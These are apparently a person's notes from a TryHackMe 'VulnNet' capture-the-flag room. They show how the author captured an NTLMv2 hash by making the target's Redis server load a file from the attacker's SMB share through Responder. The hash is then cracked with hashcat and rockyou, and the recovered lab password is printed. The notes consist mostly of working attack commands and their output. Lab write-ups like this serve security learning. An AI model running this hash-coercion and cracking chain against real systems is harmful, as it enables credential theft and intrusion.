Capturing NTLMv2 hash using crackmapexec

```
responder -I tun0
```

```
(root㉿kali)-[~/TryHackMe/VulnNet]
└─# redis-cli -h 10.10.72.213 -p 6379 eval "dofile('//10.8.167.78//share')" 0
(error) ERR Error running script (call to f_4ce9ea6916d5a0e7512ad9dba629e9baa5a5d3f8): @user_script:1: cannot open //10.8.167.78//share: Permission denied 
```

So we are trying Redis to connect us in hope of getting a hash 
we provided the ip address of both victim and us attacker's ip address
![[Pasted image 20230916175243.png]]
```
[SMB] NTLMv2-SSP Client   : 10.10.72.213
[SMB] NTLMv2-SSP Username : VULNNET\enterprise-security
[SMB] NTLMv2-SSP Hash     : enterprise-security::VULNNET:c39e8418d41fef11:A9B297BD5DB9EE7A11CB892DD3F176BD:010100000000000080182B0875E8D901704BD41F0D2013C7000000000200080047004D005100390001001E00570049004E002D0056005600430048005100450056005300370057004D0004003400570049004E002D0056005600430048005100450056005300370057004D002E0047004D00510039002E004C004F00430041004C000300140047004D00510039002E004C004F00430041004C000500140047004D00510039002E004C004F00430041004C000700080080182B0875E8D9010600040002000000080030003000000000000000000000000030000019ED69E2391A60551C3C7AD52E6F12241C974636D548641038BC7EF985F716060A001000000000000000000000000000000000000900200063006900660073002F00310030002E0038002E003100360037002E00370038000000000000000000 
```

let''s crack the hash with hashcast
hash.txt
```
enterprise-security::VULNNET:c39e8418d41fef11:A9B297BD5DB9EE7A11CB892DD3F176BD:010100000000000080182B0875E8D901704BD41F0D2013C7000000000200080047004D005100390001001E00570049004E002D0056005600430048005100450056005300370057004D0004003400570049004E002D0056005600430048005100450056005300370057004D002E0047004D00510039002E004C004F00430041004C000300140047004D00510039002E004C004F00430041004C000500140047004D00510039002E004C004F00430041004C000700080080182B0875E8D9010600040002000000080030003000000000000000000000000030000019ED69E2391A60551C3C7AD52E6F12241C974636D548641038BC7EF985F716060A001000000000000000000000000000000000000900200063006900660073002F00310030002E0038002E003100360037002E00370038000000000000000000 
```

We can either search the hash type on the hashcat wiki or using grep 
```
hashcat --help | grep NTLM
```
![[Pasted image 20230916180122.png]]

So we have to either go with 5600 or 27100
I cracked the password in windows 
```
> .\hashcat.exe -m 5600 -a 0 -D 2 .\hashes4.txt .\rockyou.txt -O
```

```
ENTERPRISE-SECURITY::VULNNET:c39e8418d41fef11:a9b297bd5db9ee7a11cb892dd3f176bd:010100000000000080182b0875e8d901704bd41f0d2013c7000000000200080047004d005100390001001e00570049004e002d0056005600430048005100450056005300370057004d0004003400570049004e002d0056005600430048005100450056005300370057004d002e0047004d00510039002e004c004f00430041004c000300140047004d00510039002e004c004f00430041004c000500140047004d00510039002e004c004f00430041004c000700080080182b0875e8d9010600040002000000080030003000000000000000000000000030000019ed69e2391a60551c3c7ad52e6f12241c974636d548641038bc7ef985f716060a001000000000000000000000000000000000000900200063006900660073002f00310030002e0038002e003100360037002e00370038000000000000000000:sand_0873959498
```

passwd: sand_0873959498

So now we have username and passwd and let's see what are the attacks possible now
